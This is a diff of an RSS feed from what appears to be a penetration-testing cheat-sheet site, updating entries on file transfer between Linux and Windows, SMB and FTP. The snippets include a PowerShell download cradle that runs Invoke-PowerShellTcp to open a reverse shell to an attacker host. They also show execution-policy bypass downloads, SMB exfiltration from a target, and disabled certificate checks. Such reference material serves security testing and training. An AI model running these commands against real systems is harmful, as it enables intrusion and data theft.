@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
-      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: PowerShell 3.0+&#xA;# Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl is not always available&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.ps1&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.</description>
+      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; # Wget powershell -ep bypass wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; # Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl and wget are alias to Invoke-WebRequest&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt;&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -UseBasicParsing) Ref: rev.</description>
     </item>
     <item>
       <title>File Transfer (Windows To Linux)</title>
@@ -48,6 +48,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
       <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>File Transfer (Windows To Windows)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_windows/</guid>
+      <description>SMB # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with server name net use \\&amp;lt;SERVER_NAME&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Mount to a drive with creds net use X: \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From local Windows to target Windows copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From target Windows to local Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Remove drive net use /d X: # Older Windows (e.</description>
     </item>
     <item>
       <title>Finger Protocol</title>
@@ -61,7 +68,7 @@
       <link>https://tldrbins.github.io/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ftp/</guid>
-      <description>Config Location /etc/vsftpd.conf Basic +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # Connect ftp &amp;lt;TARGET&amp;gt; # Over SSL lftp &amp;lt;TARGET&amp;gt; # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;lt;FILE&amp;gt; # Upload put &amp;lt;FILE&amp;gt; # Connect over tunnel passive # Exit quit Recusive download # Anonymous login wget -r ftp://anonymous:@&amp;lt;TARGET&amp;gt; # With creds wget --user &amp;lt;USER&amp;gt; --password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -m ftp://&amp;lt;TARGET&amp;gt; Note: Always check what&amp;rsquo;s in there first</description>
+      <description>Config Location /etc/vsftpd.conf Basic +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # Connect ftp &amp;lt;TARGET&amp;gt; # Over SSL lftp &amp;lt;TARGET&amp;gt; # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Upload put &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Connect over tunnel passive # Exit quit Recusive download # Anonymous login wget -r ftp://anonymous:@&amp;lt;TARGET&amp;gt; # With creds wget --user &amp;lt;USER&amp;gt; --password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -m ftp://&amp;lt;TARGET&amp;gt; Note: Always check what&amp;rsquo;s in there first</description>
     </item>
     <item>
       <title>SMB Server</title>
